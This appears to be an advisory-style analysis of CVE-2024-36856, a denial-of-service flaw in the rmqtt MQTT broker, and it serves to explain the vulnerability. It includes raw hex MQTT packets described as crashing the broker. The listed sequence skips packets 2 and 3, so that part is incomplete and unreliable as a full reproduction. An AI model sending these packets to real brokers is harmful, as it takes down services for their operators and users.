Based on the provided information, here's an analysis of CVE-2024-36856:

**Root Cause of Vulnerability:**
The root cause is a denial-of-service vulnerability triggered by a specific sequence of MQTT packets. It appears that the vulnerability is related to excessive memory consumption due to repeatedly generated client IDs and potentially long session expiration times.

**Weaknesses/Vulnerabilities Present:**
- Improper handling of MQTT packets.
- Lack of resource management when dealing with a large number of client IDs and long session expiration times.
- Insufficient input validation or sanitization of client IDs.

**Impact of Exploitation:**
- Denial of service: The vulnerability leads to the collapse of the entire rmqtt broker, rendering it unable to provide normal services. The rmqtt process is killed by the OS due to excessive memory usage.

**Attack Vectors:**
- The vulnerability is triggered by sending a specific sequence of crafted MQTT packets to the rmqtt broker.
- The attack leverages the MQTT protocol and involves fuzzing to generate the packet sequence.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send network packets to the rmqtt broker.
- No specific user level privileges are mentioned as needed for the attack.

**Technical Details**

The attack involves sending the following sequence of MQTT packets:
```
packet 1: 102200044d5154540402003c0016374d304b4b54615049377a347946474c4a656f6d5047102200044d5154540402003c0016374d304b4b54615049377a347946474c4a656f6d5047

packet 4: 104300064d51497364700380359b00165950307a73316b413570666234704a316c3848697853001d373545754461656d57385369494d595447364664735663675a30543146f0184316150002586316000e59414b4653646c4b4558496c6531d0009008772a46bce2d23f26d000
packet 5: 10cd0100044d51545405840813171500093749336e494a4e6437213c90221c54274bd6698b001468537656623669566a62734b4e70596b7a387a6543030018304a564f30464d364f693179544166536b7048326471465218e89ef58c26000c596970554d7963714e70773200124278517a71633477435969536d6672784d63001a6d554848497238415a567046334d7579747739346e68634e636e0016494c704d7073436842494f345554716539674734774d001b79754751583067326d46634d6a5367426d5a61356c355064447643
```
The packets, when sent in sequence over TCP/IP, cause the rmqtt broker to crash and disconnect.
The issue is also described as being related to repeated generation of client IDs with long session expiration, causing memory exhaustion.
